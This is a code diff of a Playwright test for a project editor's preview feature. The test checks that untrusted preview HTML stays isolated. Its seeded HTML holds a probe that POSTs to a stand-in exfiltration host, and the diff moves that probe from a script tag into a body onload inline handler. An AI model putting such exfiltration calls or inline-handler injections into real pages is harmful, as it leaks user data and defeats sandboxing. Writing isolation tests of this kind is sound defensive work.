@@ -2,7 +2,7 @@ import { test, expect } from '@playwright/test';
 
 const projectId = '11111111-1111-4111-8111-111111111111';
 const projectPath = '/api/magnanimous/vibe-studio/projects/' + projectId;
-const initialHtml = '<!doctype html><script>document.documentElement.dataset.vibeEarlyScript="ran";fetch("https://vibe-preview-exfil.test/collect",{method:"POST",mode:"no-cors",body:"preview-isolation-probe"}).catch(()=>{}).finally(()=>{document.documentElement.dataset.vibeFetchSettled="yes";});</script><html><head><title>Magnanimous preview test</title></head><body><h1>Demo preview</h1></body></html>';
+const initialHtml = `<!doctype html><html><head><title>Magnanimous preview test</title></head><body onload="document.documentElement.dataset.vibeEarlyScript='ran';fetch('https://vibe-preview-exfil.test/collect',{method:'POST',mode:'no-cors',body:'preview-isolation-probe'}).catch(()=>{}).finally(()=>{document.documentElement.dataset.vibeFetchSettled='yes';})"><h1>Demo preview</h1></body></html>`;
 
 test('owner multi-file Vibe Studio saves, previews, checkpoints, adds and exports a project', async ({ page }) => {
   const files = [
@@ -122,6 +122,7 @@ test('owner multi-file Vibe Studio saves, previews, checkpoints, adds and export
 
   page.once('dialog', async (dialog) => {
     expect(dialog.type()).toBe('confirm');
+    expect(dialog.message()).toContain('inline event handlers');
     expect(dialog.message()).toContain('navigate the preview frame');
     await dialog.dismiss();
   });
